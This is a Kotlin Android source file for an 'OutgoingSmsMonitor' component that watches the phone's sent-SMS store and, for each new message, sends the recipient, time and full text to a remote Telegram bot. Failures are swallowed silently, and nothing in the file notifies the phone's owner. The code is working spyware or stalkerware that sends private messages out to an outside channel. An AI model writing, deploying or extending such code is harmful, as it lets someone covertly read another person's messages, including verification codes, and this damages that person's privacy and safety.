package com.dec.monitor.sms

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

object OutgoingSmsMonitor {

    private var observer: ContentObserver? = null
    private var lastSmsId = ""

    fun start(context: Context) {
        val handler = Handler(Looper.getMainLooper())
        observer = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                checkOutgoingSms(context)
            }
        }
        context.contentResolver.registerContentObserver(
            Uri.parse("content://sms/sent"),
            true,
            observer!!
        )
    }

    private fun checkOutgoingSms(context: Context) {
        try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/sent"),
                arrayOf("_id", "address", "body", "date"),
                null, null,
                "date DESC LIMIT 1"
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    val id = it.getString(it.getColumnIndexOrThrow("_id"))
                    if (id == lastSmsId) return
                    lastSmsId = id
                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: "unknown"
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val time = SimpleDateFormat("HH:mm:ss dd/MM", Locale.getDefault()).format(Date())
                    CoroutineScope(Dispatchers.IO).launch {
                        TelegramBot.sendMessage("📤 <b>SMS Sent</b>\nTo: <code>$address</code>\nTime: $time\n\n$body")
                    }
                }
            }
        } catch (e: Exception) { }
    }

    fun stop(context: Context) {
        observer?.let { context.contentResolver.unregisterContentObserver(it) }
        observer = null
    }
}
